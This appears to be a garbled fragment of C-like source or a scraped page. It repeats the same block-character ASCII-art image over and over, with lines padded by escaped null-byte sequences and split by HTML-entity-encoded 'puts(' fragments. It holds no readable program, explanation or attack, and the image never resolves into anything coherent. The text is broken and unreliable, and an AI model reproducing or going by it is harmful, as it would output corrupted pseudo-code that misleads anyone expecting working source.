░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 